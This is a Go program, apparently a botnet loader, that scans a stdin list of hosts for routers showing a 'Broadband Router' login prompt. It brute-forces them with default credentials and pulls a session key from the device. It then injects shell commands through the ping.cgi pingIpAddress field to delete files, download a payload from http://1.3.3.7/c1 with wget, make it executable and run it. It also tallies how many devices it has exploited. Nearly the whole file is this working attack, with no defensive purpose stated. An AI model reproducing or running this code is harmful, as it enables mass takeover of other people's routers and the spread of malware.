#wicked was here


package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
	"encoding/base64"
    "math/rand"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound, statusExploited int
var loginsString = []string{"root:12345", "user:user", "admin:admin", ":admin", "root:root", "1234:1234", "guest:guest", "support:support"}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if (s > 0 && e > s + 1) {
        return str[s:e]
    } else {
        return "null"
    }
}

func sendExploit(target string, auth string) {

	conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
	   if err != nil {
		return
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	conn.Write([]byte("GET /pingview.cmd HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic " + auth + "\r\nConnection: close\r\nReferer: http://" + target + "/left.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 1024)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return
	}


	if strings.Contains(string(bytebuf), "&sessionKey=") {
		sessKey := getStringInBetween(string(bytebuf), "   loc += '&sessionKey=", `';
}

var code = 'location="' + loc + '"';
`)

		conn.Close()

		if sessKey == "null" {
			return
		} else {
			conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
			   if err != nil {
				return
			}

			conn.SetWriteDeadline(time.Now().Add(300 * time.Second))
			conn.Write([]byte("GET /ping.cgi?pingIpAddress=;cd%20/mnt;rm%20-rf%20c*.sh;wget%20http://1.3.3.7/c1;chmod%20777%20c1;sh%20c1;&sessionKey=" + sessKey + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic " + auth + "\r\nConnection: close\r\nReferer: http://" + target + "/ping.cgi\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
			conn.SetReadDeadline(time.Now().Add(300 * time.Second))

			bytebuf := make([]byte, 1024)
			l, err := conn.Read(bytebuf)
			if err != nil || l <= 0 {
				conn.Close()
				return
			}

			if strings.Contains(string(bytebuf), "HTTP/1.1 200 Ok") {
				statusExploited++
			}
		}
	} else {
		conn.Close()
		return
	}


}

func sendLogin(target string) (int, string) {

	var isLoggedIn int = 0
	var authToken string

	for x := 0; x < len(loginsString); x++ {
		authToken = base64.StdEncoding.EncodeToString([]byte(loginsString[x]))

		conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
	    if err != nil {
			return -1, "nil"
	    }

	    conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nAuthorization: Basic " + authToken + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1, "nil"
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200 Ok") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		statusLogins++
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1, authToken
	} else {
		return -1, "nil"
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isVuln int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nReferer: http://" + target + "/left.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "WWW-Authenticate: Basic realm=\"Broadband Router\"") {
		statusFound++
		isVuln = 1
	}
	zeroByte(bytebuf)

	if isVuln == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string) {

	defer syncWait.Done()

	if checkDevice(target, 10) == 1 {
		statusRet, authToken := sendLogin(target)
		if statusRet == -1 || authToken == "nil" {
			return
		}

		sendExploit(target, authToken)
		return
	} else {
		return
	}
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
        for {
            fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d, Exploited: %d\r\n", i, statusAttempted, statusFound, statusLogins, statusExploited)
            time.Sleep(1 * time.Second)
            i++
        }
    } ()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
			if os.Args[1] == "listen" {
				go processTarget(scan.Text())
			} else {
				go processTarget(scan.Text() + ":" + os.Args[1])
			}

			statusAttempted++
            syncWait.Add(1)
        }
    }
}
